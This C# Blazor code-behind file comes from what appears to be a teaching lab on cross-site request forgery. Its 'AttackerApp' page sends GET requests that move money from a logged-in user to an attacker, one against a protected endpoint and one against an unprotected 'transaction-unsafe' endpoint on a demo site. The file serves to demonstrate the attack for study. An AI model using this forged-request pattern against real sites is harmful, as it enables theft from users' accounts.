using Microsoft.AspNetCore.Components;

namespace AttackerApp.Pages
{
    public partial class Index
    {
        [Inject] private HttpClient HttpClient { get; set; } = new();

        private const string AttackerName = "Attacker Name";
        private string _successMessage = string.Empty;

        private async void Attack()
        {
            // if the user is logged in to the other application, this will send money from the user to the attacker
            await HttpClient.GetAsync($"https://web2lab2.azurewebsites.net/transaction?recipient={AttackerName}");
            _successMessage = "Money not sent to attacker! You can check the code on github to see how this works!";
        }
        
        private async void AttackUnprotected()
        {
            // the unsafe version of the endpoint does not check properly the state of the user and will send money to the attacker
            await HttpClient.GetAsync($"https://web2lab2.azurewebsites.net/transaction-unsafe?recipient={AttackerName}");
            _successMessage = "Money sent to attacker if the user is logged in to the other app! You can check the code on github to see how this works!";
            StateHasChanged();
        }
    }
}